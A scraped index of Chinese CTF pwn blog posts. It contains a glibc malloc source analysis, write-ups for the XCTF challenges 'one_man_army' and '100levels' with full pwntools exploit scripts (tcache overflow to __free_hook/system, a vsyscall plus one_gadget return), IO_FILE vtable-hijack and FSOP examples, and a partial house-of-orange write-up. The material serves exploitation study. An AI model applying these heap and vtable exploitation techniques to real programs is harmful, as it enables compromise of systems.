(__builtin_e xpect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,//victim的size需要大于等于2 * SIZE_SZ，也不能超过mmap分配的size chunk2mem (victim), av); size = chunksize (victim);//计算分配内存的size并保存。 ​ 接着是每一次循环中的操作。 ​ 如果是一个small chunk的请求，并且此时unsorted bin中只有一个bin的话，首先尝试分配last remainder中的chunk。这个操作只会在small chunk没有 exact fit情况下发生，并且是best fit的唯一例外。 ​ 下面是这种“例外”的代码实现。 1234567891011121314151617181920212223242526272829303132if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) //进入该分支的条件： //1）size在small bin范围内。 //2）unsorted bin中仅有一个chunk。 //3）chunk属于last reminder。 //4）该chunk需大于申请的size+min size（以便分割last remainder，并将留下的chunk作为新的last remainder） &#123; /* split and reattach remainder */ remainder_size = size - nb;//新的remainder size等于unsorted bin中chunk的size 减去用户分配的size remainder = chunk_at_offset (victim, nb);//获取remainder指针 unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;//将remainder链入unsorted bin链表中 av-&gt;last_remainder = remainder;//更新last_remainder remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); //同理 if (!in_smallbin_range (remainder_size))//如果新的remainder不在small bin size内 &#123; remainder-&gt;fd_nextsize = NULL;//清空remainder 中的fd_nextsize和bk_nextsize位 remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size);//设置remainder的matadata check_malloced_chunk (av, victim, nb);//初始化从last_remainder中切割并返回给用户的chunk空间 void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; ​ 下面是unsorted bin中不止有一个bin的情况，这时候就直接将chunk unlink。 ​ 如果申请的size正好等于此时unsorted bin的size，那么直接设置为used状态并初始化内存，返回用户对应的指针。 12345678910if (size == nb) &#123; set_inuse_bit_at_offset (victim, size);//设置为used if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb);//分配chunk内存空间，并初始化 void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; ​ ​ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384 /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb)//如果申请的size正好等于此时unsorted bin的size，那么直接设置为used状态并初始化内存，返回用户对应的指针 &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* place chunk in bin */ if (in_smallbin_range (size))//如果取出的bin的size位于small bin &#123; victim_index = smallbin_index (size);//获取idx bck = bin_at (av, victim_index);//将unsorted bin插入small bin链表中 fwd = bck-&gt;fd;// &#125; else &#123; victim_index = largebin_index (size);//同理 bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ if (fwd != bck)//如果该链表中已存在空闲chunk &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE;//直接设置next chunk的prev_inuse为1 /* if smaller than smallest, bypass loop below */ assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);// if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))//如果当前chunk的size小于最后一个chunk，则需要将该chunk插入到large bin链表的最后。 &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size)//当size比最小的chunk大的时候，就需要利用while遍历laege bin来寻找插入的位置。 &#123; fwd = fwd-&gt;fd_nextsize;//对large bin遍历 assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size)//size相等的情况 /* Always insert in the second position. */ fwd = fwd-&gt;fd;//只需改变victim的及相邻chunk的fd，bk，而不需要改变fd_nextsize等，因为相同大小的chunk只有最低地址的chunk会设置fd_nextsize和bk_nextsize指针。 else &#123; victim-&gt;fd_nextsize = fwd;//类似上面 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk;// &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim;#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; &#125; ​ ​ ​ ​ ​","categories":[{"name":"HEAP - sourcecode analysis","slug":"HEAP-sourcecode-analysis","permalink":"https://fuurinko.github.io/categories/HEAP-sourcecode-analysis/"}],"tags":[{"name":"源码分析","slug":"源码分析","permalink":"https://fuurinko.github.io/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"}]},{"title":"攻防世界 - one_man_army","slug":"week7-2.1md","date":"2022-04-12T02:02:09.112Z","updated":"2022-04-14T14:05:46.106Z","comments":true,"path":"2022/04/12/week7-2.1md/","link":"","permalink":"https://fuurinko.github.io/2022/04/12/week7-2.1md/","excerpt":"","text":"overview libc是2.27。 逆向增删查改。 add没有什么特别的地方，纯纯的指针操作。没有结构体，没有保存指针到bss上。但是会对输入的size取低九位，虽然可以输入15位的size，但是生效的只有九位。所以只能add出 一个chunk。有点lonely wolf的味道。 12345678printf(&quot;Size: &quot;); read(0, size_4, 0xFuLL); size_2 = atoi(size_4); size = size_2 &amp; 0x1FF; ptr = (char *)malloc(size_2 &amp; 0x1FF); printf(&quot;Content: &quot;); read(0, ptr, size); puts(&quot;Done!&quot;); show12345int show()&#123; puts(ptr); return puts(&quot;Done!&quot;);&#125; …不好评价。 free123456int free_0()&#123; free(ptr); ptr = 0LL; return puts(&quot;Done!&quot;);&#125; 如何评价。 edit1234567if ( v4 == 0x2333 ) &#123; if ( !dword_4050 ) &#123; read(0, ptr, 0x100uLL); &#125; &#125; 就是个edit，挺无聊的。但是可以覆盖top chunk，也许是一道house of force。 利用构造unsorted bin leak​ 保护全开，只能改hook，考虑到free没有uaf，并且没有可以劫持的指针。edit可以溢出到top chunk。 ​ 目前来看可以利用的点只有这里。top chunk溢出的利用我只做过house of force和house of orange，显然这里不需要house of orange，但是也不是不能用。house of force首先得申请任意size chunk，这边明显对size做了限制，虽然也能申请到比较大的chunk，但是还是达不到force的条件。 ​ house of orange倒是可行，但是不清楚后续利用的可行性，可以先试一试。 ​ 哄堂大笑了，house of orange也不行，size最大为511，小于进行页对齐的top chunk size的720（就算这种极限情况可以达到也没什么意义吧） ​ 好的，唯一会的两种情况都不行，还是得回过头看tcache double free。 ​ 目前发现的一个可以利用的点就是，利用堆溢出修改下一个chunk的size，伪造large chunk实现leak。 12345678910add(0x20,b&#x27;a&#x27;)#0free()#tcacha bin 0x30add(0x80,b&#x27;a&#x27;)#1free()#tcache bin 0x90add(0x100,b&#x27;a&#x27;)add(0x20,b&#x27;a&#x27;)#0edit(b&#x27;a&#x27;*0x20 + p64(0) + p64(0x401))add(0x80,b&#x27;a&#x27;)free() ​ 这段exp是可以修改size为0x401的，不过我怎么也想不通， ​ 为什么会有0x400的tcache，不是应该直接放到unsorted bin里吗？于是我爬了，我去看wp了。 ​ 看完了，虽然没有发现为什么会有0x410的tcache，但是按照我这个wp，我只纯粹地把chunk size修改为了0x401，但是无法进行后续的利用。 ​ 而这是正常的版本： 12345678910111213141516171819202122232425262728 for i in range(1, 0x10): add(i * 0x10,b&quot;a&quot;) free()#0-9#将0x100范围内的chunk每个放一个进入tcache。add(0x10,b&quot;a&quot;)#10#申请，此时会申请到刚才循环中free的0x10的chunk。payload = b&quot;a&quot;*0x10 + p64(0) + p64(0x4b1)#覆盖下一个chunksize（size为0x20的tcachebin）为0x4b1edit(payload)free()#此时被free的指针指向#10，也就是#0add(0x20,b&quot;a&quot;)#申请，ptr指向#1，也就是刚刚覆盖的size为0x4b1的chunk。#此处有一个问题，就是为什么我申请0x20的chunk，不会把0x4b1覆盖为0x31,这个问题留到源码分析时解决。free()#free1，也就是free 0x4b1chunk，此时可以在unsorted bin中看到这个bin。但是由于它是一个free chunk，我们没有办法把它show出来，因此需要让新申请的chunk指向它。add(0x20,b&quot;a&quot;)#申请，ptr指向#1。这里0x30的空间来源于tcachebin，所以指针会指向#1，但是并不会改变unsorted bin的偏移。add(0x30,b&quot;a&quot;)#再次申请0x30的chunk，此时从unsorted bin中分割0x40大小的空间，指针向前偏移0x40，正好指向#2。show()malloc_hook = u64(p.recvuntil(&quot;\\n&quot;, drop = True).ljust(8, b&quot;\\x00&quot;)) - 88 - 0x10libc_base = malloc_hook - libc.symbols[&quot;__malloc_hook&quot;] log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]log.success(&quot;free_hook =&gt; &#123;&#125;&quot;.format(hex(free_hook)))system_addr = libc_base + libc.symbols[&quot;system&quot;]log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr))) ​ 在free了这个unsorted bin后，bin中状态如图： ​ 申请0x20的chunk以后，unsorted bin的first bin指针向后偏移了0x30，也就指向了0x30 free chunk的位置，这说明我们刚刚申请的chunk是通过unsorted bin分割出来的。为什么会是unsorted bin分割而不是tcache分配呢》我不知道。 ​ 再申请0x30的chunk，此时unsorted bin并没有偏移，还是指向2a0，也就是原本0x30 free chunk，也就是我们刚刚申请的chunk的位置，这样我们unsorted bin指向的chunk就是一个可以show出来的chunk了。 ​ 改free hook为system​ 接着的利用比较常规。 ​ 在上面的步骤中，我们的申请使得现在指针指向的是0x30的chunk。也是一个unsorted bin。填充0x30的垃圾数据，溢出到下一个0x40的chunk。为了使下一个申请0x40的时候能申请到这一片内存，编辑其size为0x50，然后修改fd为使其指向free_hook。 1234567payload = b&#x27;a&#x27;*0x30 + p64(0) + p64(0x50) + p64(free_hook)edit(payload)add(0x40,b&#x27;a&#x27;)add(0x40,b&#x27;a&#x27;)#point to free_hookedit(p64(system_addr)) add(0x50,b&#x27;/bin/sh;&#x27;)free() ​ 问题1不知道为什么就突然给我报错，明明没有任何问题。 蚌埠住了，把edit的sendline()改成send就没问题了。以后输入字符串的话都不能加line。 2​ 在覆盖下一个chunk的size为0x4b1之后，为什么在此在这个地方申请0x20的chunk不会把0x4b1的size字节覆盖？还有为什么是0x4b1？ 3​ 关于unsorted bin的分配优先级以及指针的一些规则还是不太明白。以及tcache的分配，tcache bin的分配规则都是模糊不清的。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *libc = ELF(&quot;./libc-2.27.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&#x27;./oneman_army&#x27;)#p = remote(&quot;111.200.241.244&quot;,57601)elf = ELF(&#x27;./oneman_army&#x27;)def add(size,content): p.sendlineafter(&quot;choice:&quot;,&#x27;1&#x27;) p.sendlineafter(&quot;Size: &quot;,str(size)) p.sendafter(&quot;Content:&quot;, content)def edit(content): p.sendlineafter(&quot;choice: &quot;,&#x27;9011&#x27;) p.send(content)def show(): p.sendlineafter(&quot;choice: &quot;,&#x27;2&#x27;)def free(): p.sendlineafter(&quot;choice: &quot;,&#x27;3&#x27;) for i in range(1, 0x10): add(i * 0x10,b&quot;a&quot;) free()#0-9add(0x10,b&quot;a&quot;)#10payload = b&quot;a&quot;*0x10 + p64(0) + p64(0x4b1)#覆盖下一个chunksize（size为0x20的tcachebin）为0x4b1edit(payload)free()#此时被free的指针指向#9，也就是#0add(0x20,b&#x27;a&#x27;)#指向#1free()#free1，也就是free 0x4b1chunk，此时可以在unsorted bin中看到这个bin。add(0x20,b&#x27;a&#x27;)gdb.attach(p)add(0x30,b&#x27;a&#x27;)show()malloc_hook = u64(p.recvuntil(&quot;\\n&quot;, drop = True).ljust(8, b&quot;\\x00&quot;)) - 96 - 0x10#malloc_hook = 0x7ffff7dcdca0 - 96 - 0x10libc_base = malloc_hook - libc.symbols[&quot;__malloc_hook&quot;] log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]log.success(&quot;free_hook =&gt; &#123;&#125;&quot;.format(hex(free_hook)))system_addr = libc_base + libc.symbols[&quot;system&quot;]log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))payload = b&#x27;a&#x27;*0x30 + p64(0) + p64(0x50) + p64(free_hook)edit(payload)add(0x40,b&#x27;a&#x27;)add(0x40,b&#x27;a&#x27;)#point to free_hookedit(p64(system_addr)) add(0x50,b&#x27;/bin/sh;&#x27;)free()p.interactive() 参考ADworld pwn wp - onemanarmy","categories":[{"name":"HEAP - Tcache","slug":"HEAP-Tcache","permalink":"https://fuurinko.github.io/categories/HEAP-Tcache/"}],"tags":[{"name":"xctf","slug":"xctf","permalink":"https://fuurinko.github.io/tags/xctf/"}]},{"title":"攻防世界 - 100levels","slug":"week7-1.1","date":"2022-04-11T12:02:33.312Z","updated":"2022-05-16T12:46:25.742Z","comments":true,"path":"2022/04/11/week7-1.1/","link":"","permalink":"https://fuurinko.github.io/2022/04/11/week7-1.1/","excerpt":"","text":"overviewpartial relro，没有canary，栈溢出。 逆向12if ( unk_20208C ) sprintf(v1, &quot;Hint: %p\\n&quot;, &amp;system); ​ 如果能在这个变量上写东西，就能leak。那就不是ret2libc了。并且开了pie，也不好rop。 123456789&#123; __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF memset(buf, 0, sizeof(buf)); if ( read(0, buf, 0x1FuLL) &gt; 0 ) return strtol((const char *)buf, 0LL, 10); else return -1LL;&#125; ​ 有栈溢出。 ​ 算数游戏内也有 12printf(&quot;Question: %d * %d = ? Answer:&quot;, v6, v5);read(0, buf, 0x400uLL); 我的疑思​ 套板子不太行，还是需要想个办法把system打印出来，然后直接用system来rop。 ​ 但是说实话，没有思路。这个bss上的全局变量没有任何与程序上的关联，也不太可能通过输入什么东西溢出到那，唯一的可能就是构造任意地址写。 ​ 但是我们能够利用的只有一个没办法进行rop的程序执行流跳转，不leak基址都是白搭。所以虽然程序给了partial relro，但是在leak前修改got的可能性非常小，而改got还是得需要地址。 ​ 难绷，去看了wp，发现这得看汇编才能找到突破点。 利用​ ![截屏2022-04-11 下午9.35.53](/Users/rin/Library/Application Support/typora-user-images/截屏2022-04-11 下午9.35.53.png) ​ 这个题的突破点就在于，不管这个全局变量是不是有值，在调用hint函数后system都会被加载在hint栈帧的rbp+0x110处。并且，如果我们开始游戏的输入level环节输入了小于0的数，那么这个变量将不会被初始化， ​ ​ 也就是如果在输入v4的时候输入0，v4就还是system的地址，在第二次输入的时候输入system与one_gadget的偏移，就能使v5变为one_gadget的地址。这样我们就获得了一个栈上的可以利用的地址。 ​ 但是如何ret到这个地址呢？ ​ 观察栈帧，可以发现，当我们选择在play函数中溢出，play函数上一个函数栈帧，也就是run函数的物理相邻，正好就是run函数的函数局部变量，而system的地址与play的返回地址就只差了24字节。 ​ 如果是一般的栈题我们可以直接用ret或者pop调栈，但是由于pie我们无法进行普通的rop，但是可以利用到vsyscall做到相似的结果。 ​ vsyscall并不受pie影响，始终在0xffffffffff600000-0xffffffffff601000区域内，所以我们可以在返回地址连续填写三次vsyscall，获得类似ret的效果。 ​ 但是需要注意的是因为之前level被改成了地址，所以是大于100的，于是需要先写脚本进行99次游戏，才能在最后一次的时候覆盖返回地址。 ​ exp直接copy了，我这里应该调不动。 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import*from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./100levels&quot;)elf = ELF(&quot;./100levels&quot;)one_gadget = 0x45216sys_addr = 0x45390offset = one_gadget - sys_addrvsys_addr = 0xffffffffff600007def play(): p.recvuntil(&#x27;Question: &#x27;) a = p.recvuntil(&#x27; &#x27;) a = a[:-1] a = int(a, 10) p.recvuntil(&#x27;* &#x27;) b = p.recvuntil(&#x27; &#x27;) b = b[:-1] b = int(b, 10) p.recvuntil(&#x27;Answer:&#x27;) p.sendline(str(a * b))p.recvuntil(&quot;Choice:\\n&quot;)p.sendline(&#x27;1&#x27;)p.recvuntil(&#x27;How many levels?\\n&#x27;)p.sendline(&#x27;-1&#x27;)p.recvuntil(&#x27;Any more?\\n&#x27;)p.sendline(str(offset))p.recvuntil(&quot;Let&#x27;s go!&#x27;\\n&quot;)for i in range(99): play()p.recvuntil(&#x27;Answer:&#x27;)payload = b&#x27;a&#x27;*0x38 + p64(vsys_addr) * 3 p.sendline(payload)p.interactive()","categories":[{"name":"STACK - Other","slug":"STACK-Other","permalink":"https://fuurinko.github.io/categories/STACK-Other/"}],"tags":[{"name":"xctf","slug":"xctf","permalink":"https://fuurinko.github.io/tags/xctf/"}]},{"title":"IO_FILE学习","slug":"heap_learning_io_file","date":"2022-04-10T14:44:00.000Z","updated":"2022-04-11T03:42:51.032Z","comments":true,"path":"2022/04/10/heap_learning_io_file/","link":"","permalink":"https://fuurinko.github.io/2022/04/10/heap_learning_io_file/","excerpt":"","text":"overview大致原理​ glibc定义了_IO_FILE这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的_IO_FILE_plus结构。 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。 ​ 结构源码如下： 12345struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; ​ 这个结构包含了一个叫vtable的指针，指向实现io函数各种功能的真正函数。我们可以通过劫持这个vtable指针，来getshell或者更进一步利用。 ​ 在研究如何利用前，还是需要知道这个结构调用的大致流程，这里以fread为例子简述。 fread​ 具体的源码就不看了，太冗杂了，但是差不多就是一层一层地调用： 标准IO库中的_IO_fread() –&gt; 子函数_IO_sgetn()–&gt; vtable指针_IO_XSGETN–&gt;函数_IO_file_xsgetn ​ 而vtable本身也是一个指针，指向结构体_IO_jump_t ​ _IO_jump_t源码如下 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 这里vtable就像一个中转站，通过它调用_IO_jump_t中的各种函数。 比如说这里fread就是调用的_IO_file_xsgetn函数。 值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用_IO_file_xsgetn 函数。 12345678if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123; if (__underflow (fp) == EOF) break; continue; &#125; 函数源码如上，实现的是一个键盘输入。 实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。 vtable攻击大致分析​ 在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。 ​ 那么应该如何伪造vtable呢？​ 目前有两种思路。 ​ 一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。 ​ 在libc2.24及以后的版本vtable被改为只读，所以只能用第二种方法，也就是伪造vtable。 修改VTABLE内容​ libc-2.23以前的版本都可以使用这个方法来攻击。(不包括2.23) ​ 首先需要找到vtable的地址，vtable位于_IO_FILE_plus中，对于64位环境，vtable与_IO_FILE_plus中有固定的偏移，为0xd8。_IO_FILE_plus的地址，对于 fopen 的情况下是位于堆内存，对于 stdin\\stdout\\stderr 是位于 libc.so 中。 ​ 接着需要知道我们想要劫持的函数在vtable中是具体调用哪一个函数，比如说printf()则是调用vtable中的xspun，于是我们查询这个函数对应的vtable中的偏移，并修改对应指针就行。 ​ 劫持指针的一个大致的操作。 123vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtablevtable_ptr[7]=0x41414141 //xsputnprintf(&quot;call 0x41414141&quot;); ​ 如果要给劫持的函数传参，就需要根据不同的io函数，构造不同的地址。比如说我们劫持了printf函数，而这个函数正常情况下被传入的第一个参数是对应的_IO_FILE_plus 地址，也就是_IO_2_1_stdout_的地址，所以我们可以这样操作： 1234567 FILE *fp; long long *vtable_ptr; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); vtable_ptr=*(long long*)((long long)fp+0xd8); memcopy(fp,&quot;sh&quot;,3); vtable_ptr[7]=system_ptr //xsputn fwrite(&quot;hi&quot;,2,1,fp); 伪造VTABLE​ 示例来源于ctf-wiki 1234567891011121314151617181920#define system_ptr 0x7ffff7a52390;int main(void)&#123; FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,&quot;sh&quot;,3); fake_vtable[7]=system_ptr; //xsputn fwrite(&quot;hi&quot;,2,1,fp);&#125; ​ 就是在覆盖vtable指针为fake vatble，指定对应偏移调用函数为system()，并利用之前说到的传参方式传入参数。 FSOP大致思路​ 当程序执行退出，或者从main函数返回，或者libc abort的时候，就会执行_IO_flush_all_lockp 这个函数，而这个函数又会调用vtable中的_IO_overflow，按照之前vtable攻击的思路，我们也许能将这个函数改为one_gadget或者其他什么getshell的东西。 ​ 我们的实际目的就是修改vtable中的_IO_overflow，但是一般来说程序并不会使我们能够轻易地直接修改vtable的值，或者伪造vtable，难点就是我们很难直接覆盖_IO_FILE_plus中的指针为我们想要的值，既然覆盖做不到，那么伪造不失为一个办法。 ​ 那么我们就需要以_IO_FILE_plus为单位伪造。在正常情况下，维护文件系统的链表头节点为 _IO_list_all，并且这个头节点作为全局变量被储存在libc中。_IO_list_all指向的每一个节点都是一个_IO_FILE_plus，所以如果我们能够覆盖_IO_list_all,使其指向我们伪造的_IO_FILE_plus，就能够劫持vtable，从而实现对于vtable表项的修改。 具体操作1234567891011121314151617181920212223242526#define _IO_list_all 0x7ffff7dd2520#define mode_offset 0xc0#define writeptr_offset 0x28#define writebase_offset 0x20#define vtable_offset 0xd8int main(void)&#123; void *ptr; long long *list_all_ptr; ptr=malloc(0x200); *(long long*)((long long)ptr+mode_offset)=0x0; *(long long*)((long long)ptr+writeptr_offset)=0x1; *(long long*)((long long)ptr+writebase_offset)=0x0; *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100); *(long long*)((long long)ptr+0x100+24)=0x41414141; list_all_ptr=(long long *)_IO_list_all; list_all_ptr[0]=ptr; exit(0);&#125; ​ 还是wiki上的一个简单的例子。 ​ 伪造_IO_FILE_plus还是需要绕过比较多的检测的。检测的源码如下： 12345f (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) &#123; result = EOF; &#125; ​ 也就是 12fp-&gt;_mode &lt;= 0 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base ​ 所以在示例中，三个偏移指向的值都满足了检测的条件，也就能成功执行了。","categories":[{"name":"OTHER - IO FILE","slug":"OTHER-IO-FILE","permalink":"https://fuurinko.github.io/categories/OTHER-IO-FILE/"}],"tags":[{"name":"io_file","slug":"io-file","permalink":"https://fuurinko.github.io/tags/io-file/"}]},{"title":"攻防世界 - house of orange","slug":"week6-7.2","date":"2022-04-10T09:02:58.445Z","updated":"2022-04-13T03:18:44.117Z","comments":true,"path":"2022/04/10/week6-7.2/","link":"","permalink":"https://fuurinko.github.io/2022/04/10/week6-7.2/","excerpt":"","text":"overview 逆向​ 没有free，只有增查改。 ​ 这个题程序逻辑比较简单，主要是利用相对比较复杂。 add​ 最多申请三个house。并且在申请house开始为每个house创建了0x10 size的结构体，只有两个字段，size和content ptr。在输入name的阶段会把name读入content ptr指向的地址。 12printf(&quot;Name :&quot;);read_str((void *)chunk_struct_ptr[1], size); ​ 接着输入每个橘子的价钱和颜色。颜色不能自己指定，程序提供了一个抽象的菜单以供选择。我们看一下这个菜单。 ​ 难绷。 ​ 价格被读入一个由calloc()创建的,只有一个size为8的item的chunk中。数量范围被限制在0-7或56746。 12345678910111213141516171819read_str(*((void **)chunk_struct_ptr + 1), size);price_chunk = calloc(1uLL, 8uLL);printf(&quot;Price of Orange:&quot;);*price_chunk = read_num();color_menu(); printf(&quot;Color of Orange:&quot;);color_num = read_num();if ( color_num != 56746 &amp;&amp; (color_num &lt;= 0 || color_num &gt; 7) )&#123; puts(&quot;No such color&quot;); exit(1);&#125;if ( color_num == 0xDDAA ) price_chunk[1] = 0xDDAA;else price_chunk[1] = color_num + 30;*chunk_struct_ptr = price_chunk;qword_203068 = chunk_struct_ptr;++idx; ​ ​ ​ 当颜色为56746时，将对应price chunk的第二个字段覆盖为0xddaa。然后就直接把price_chunk的指针保存到chunk_struct_ptr的开头。接着把chunk_struct_ptr保存到bss段上。 ​ 另外全程也没有看到和idx有关的指针操作，估计也是只能控制一个house。 ​ show ​ 不得不说这个活整得真得很，，可爱。 ​ 也就是，输入56746会获得橙色的橘子。 ​ 所以两个show的逻辑基本一致，就是show出house的名字和价格，颜色就纯纯整活。 edit​ 有很明显的堆溢出漏洞。 12345printf(&quot;Name:&quot;); read_str((void *)buf[1], num); printf(&quot;Price of Orange: &quot;); v1 = (_DWORD *)*buf; *v1 = read_num(); ps：写菜单的时候不要看错了，这个“Name：”的冒号前面没有空格，蚌埠住了。 利用整体思路​ 这道题是经典题了，堆上的话肯定就是利用堆溢出修改top chunk size，以获得unsorted bin。但是后面的利用我就不会了，因为没有做过io_file的题。所以我自己做的话就做到获得unsorted bin为止了。 修改top chunk size随便覆盖一些，果然能把top chunk size覆盖，因此我们可以计算需要覆盖的值。 我这里的堆地址比较畸形，就是都是7f开头的，不过目前不影响，之前的top chunk size为0x20f91，地址是070，加起来正好是0x1000，所以我们只需要覆盖为f91就能实现页对齐。 123add(0x20,b&#x27;a&#x27;*0x20)payload = b&#x27;b&#x27;*0x20 + p64(0) + p64(0x21) + b&#x27;a&#x27;*0x10 + p64(0) + p64(0xf91)edit(len(payload),payload) 获得unsorted bin，leak libc​ 然后直接申请一个0x1000大小的chunk，让堆以brk的形式拓展，就获得了0xf91大小的unsorted bin。 ​ 接着我们还需要leak libc和heap，这里我们可以直接申请一个比较大的范围为large chunk的name，使其能够同时leak libc地址和heap基址。能够同时leak当然是因为large chunk的fd_nextsize与bk_nextsize字段。 ​ ​ 当然如果只是申请small chunk大小的话就只能leak libc，heap需要另外leak。不过接收的话还是要分别来。 1234567891011121314add(0x1000,b&#x27;b&#x27;*0x1000)add(0x400,b&#x27;a&#x27;*8)show()p.recvuntil(&quot;aaaaaaaa&quot;)malloc_hook = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) - 88 - 0x10log.success(&quot;malloc_hook =&gt; &#123;&#125;&quot;.format(hex(malloc_hook)))libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))edit(0x400,b&#x27;b&#x27;*0x10)show()p.recvuntil(b&quot;b&quot;*0x10)heap_addr = u64(p.recvuntil(b&#x27;\\n&#x27;,drop=True).ljust(0x8,b&quot;\\x00&quot;)) - 0xd0log.success(&quot;heap_addr =&gt; &#123;&#125;&quot;.format(hex(heap_addr))) ​ ​ 接下来就是io_file的利用了。 FSOP​ 由于之前从来咩有做过io_file，所以为了好归纳我就还是再开一篇笔记来专门做io_file的学习笔记吧。等把fsop看完了再来把这个当做例题看。 ​ 看完了fsop，回来做题了。 ​ 